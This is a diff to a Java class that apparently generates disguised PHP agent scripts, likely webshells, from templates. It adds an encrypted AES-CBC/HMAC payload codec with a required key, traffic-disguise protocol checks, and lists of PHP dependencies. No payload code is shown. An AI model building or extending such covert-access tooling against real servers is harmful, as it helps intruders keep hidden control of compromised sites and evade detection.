@@ -1,11 +1,13 @@
 package org.leo.phpcore.generator;
 
 import org.leo.core.entity.Disguise;
+import org.leo.core.disguise.DisguiseProtocol;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.generator.ScriptGeneratorProvider;
 import org.leo.core.runtime.PuppetRuntime;
 import org.leo.phpcore.disguise.PhpSourceSupport;
+import org.leo.phpcore.payload.PhpPayloadSource;
 import org.springframework.stereotype.Component;
 
 import java.io.IOException;
@@ -60,6 +62,9 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("fileExtensions", List.of("php"));
         metadata.put("minimumVersion", MINIMUM_VERSION);
         metadata.put("protocols", List.of("http"));
+        metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
+        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
+        metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
         metadata.put("outputModes", List.of(OUTPUT_COMPACT, OUTPUT_PACKED, OUTPUT_PORTABLE));
@@ -73,11 +78,17 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
                 OUTPUT_PACKED, "deflate-base64",
                 OUTPUT_PORTABLE, "plain-php"));
         metadata.put("requirements", Map.of(
-                OUTPUT_COMPACT, Map.of("minVersion", MINIMUM_VERSION),
+                OUTPUT_COMPACT, Map.of("minVersion", MINIMUM_VERSION,
+                        "extensions", List.of("json", "openssl", "zlib"),
+                        "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
+                                "hash_hmac", "hash_equals", "gzencode", "gzdecode")),
                 OUTPUT_PACKED, Map.of("minVersion", MINIMUM_VERSION,
-                        "extensions", List.of("zlib"),
+                        "extensions", List.of("json", "openssl", "zlib"),
                         "functions", List.of("base64_decode", "gzinflate")),
-                OUTPUT_PORTABLE, Map.of("minVersion", MINIMUM_VERSION)));
+                OUTPUT_PORTABLE, Map.of("minVersion", MINIMUM_VERSION,
+                        "extensions", List.of("json", "openssl", "zlib"),
+                        "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
+                                "hash_hmac", "hash_equals", "gzencode", "gzdecode"))));
         return metadata;
     }
 
@@ -91,6 +102,10 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         }
         Disguise requestDisguise = requireDisguise(request.getRequestDisguise(), "请求");
         Disguise responseDisguise = requireDisguise(request.getResponseDisguise(), "响应");
+        String payloadKey = optionString(request.getOptions(), "payloadKey");
+        if (payloadKey == null || payloadKey.trim().isEmpty()) {
+            throw new IllegalArgumentException("PHP PayloadCodec AES 密钥不能为空");
+        }
         String outputMode = outputMode(request.getOptions());
         int responseCode = optionInt(request.getOptions(), "respCode", 200, 200, 599);
         if (responseCode == 204 || responseCode == 205 || responseCode == 304) {
@@ -119,6 +134,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         List<String> components = DEFAULT_COMPONENTS;
         String expandedSource = compactTemplate(readTemplate(TEMPLATE))
                 .replace("{{WIRE_HELPERS}}", PhpSourceSupport.wireHelpers())
+                .replace("{{PAYLOAD_CODEC}}", PhpPayloadSource.functions(payloadKey.trim()))
                 .replace("{{REQUEST_DECODER}}", requestDecoder)
                 .replace("{{RESPONSE_ENCODER}}", responseEncoder)
                 .replace("{{PHP_CORE}}", coreSource)
@@ -139,7 +155,9 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("type", "PHP");
         metadata.put("protocol", "http");
         metadata.put("minimumVersion", requirements.get("minVersion"));
-        metadata.put("protocolVersion", 2);
+        metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
+        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
+        metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
         metadata.put("outputMode", outputMode);
@@ -206,6 +224,15 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
             functions.add("base64_decode");
             functions.add("gzinflate");
         }
+        extensions.add("openssl");
+        extensions.add("zlib");
+        functions.add("openssl_encrypt");
+        functions.add("openssl_decrypt");
+        functions.add("openssl_random_pseudo_bytes");
+        functions.add("hash_hmac");
+        functions.add("hash_equals");
+        functions.add("gzencode");
+        functions.add("gzdecode");
         if (!extensions.isEmpty()) requirements.put("extensions", extensions.stream().sorted().toList());
         if (!functions.isEmpty()) requirements.put("functions", functions.stream().sorted().toList());
         return requirements;
@@ -426,8 +453,9 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
 
     private Disguise requireDisguise(Disguise disguise, String label) {
         PhpSourceSupport.requirePhp(disguise);
-        if (disguise.getProtocolVersion() < 2) {
-            throw new IllegalArgumentException(label + "伪装必须使用 protocolVersion 2");
+        if (disguise.getProtocolVersion() < DisguiseProtocol.PROTOCOL_VERSION) {
+            throw new IllegalArgumentException(label + "伪装必须使用 protocolVersion "
+                    + DisguiseProtocol.PROTOCOL_VERSION);
         }
         return disguise;
     }
